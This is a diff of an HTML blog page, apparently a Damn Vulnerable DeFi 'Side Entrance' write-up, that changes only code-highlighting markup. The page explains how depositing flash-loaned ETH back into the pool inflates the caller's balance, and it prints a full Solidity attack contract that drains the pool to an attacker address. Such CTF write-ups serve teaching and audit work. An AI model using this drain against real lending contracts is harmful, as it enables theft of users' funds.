@@ -127,19 +127,19 @@ You must take all ETH from the lending pool.</code></pre></div>
 <p>In this challenge, we must take all ETH from the lending pool. <code class="language-text">SideEntranceLenderPool contract</code> provides flashloan just like previous contracts. This pool contract also contains <code class="language-text">deposit()</code> function and <code class="language-text">withdraw()</code> function as well. The vulnerability comes from <code class="language-text">deposit()</code> function. It increases balance of <code class="language-text">msg.sender</code>, however, it does not check if the balance of pool has really increased.</p>
 <p>There is a line of code in <code class="language-text">flashLoan()</code>:  <code class="language-text">IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();</code>. This line of code allows <code class="language-text">msg.sender</code> to execute <code class="language-text">execute()</code> function from itself. We can call <code class="language-text">deposit()</code> function during flash loan to increase balance of ourselves, and we can withdraw.</p>
 <p>Here is attack contract:</p>
-<div class="gatsby-highlight" data-language="soildity"><pre class="language-soildity"><code class="language-soildity">contract FlashLoanEtherReceiver {
-    function execute() external payable {
-        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
-    }
+<div class="gatsby-highlight" data-language="solidity"><pre class="language-solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">FlashLoanEtherReceiver</span> <span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
+        <span class="token function">SideEntranceLenderPool</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">.</span>deposit<span class="token punctuation">{</span>value<span class="token punctuation">:</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    function attackSideEntranceLenderPool(SideEntranceLenderPool pool, address attacker) public {
-        pool.flashLoan(address(pool).balance);
-        pool.withdraw();
-        payable(attacker).transfer(address(this).balance);
-    }
+    <span class="token keyword">function</span> <span class="token function">attackSideEntranceLenderPool</span><span class="token punctuation">(</span>SideEntranceLenderPool pool<span class="token punctuation">,</span> <span class="token builtin">address</span> attacker<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+        pool<span class="token punctuation">.</span><span class="token function">flashLoan</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>pool<span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        pool<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">payable</span><span class="token punctuation">(</span>attacker<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    receive() external payable{}
-}</code></pre></div>
+    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre></div>
 <br>
 <p>By calling, attackSideEntranceLenderPool, we execute flashLoan, and during flashLoan, it will execute <code class="language-text">execute()</code> function from attack contract which will deposit flash loan amount. Then we withdraw from the pool and send stolen ETH to attacker.</p>
 <hr>
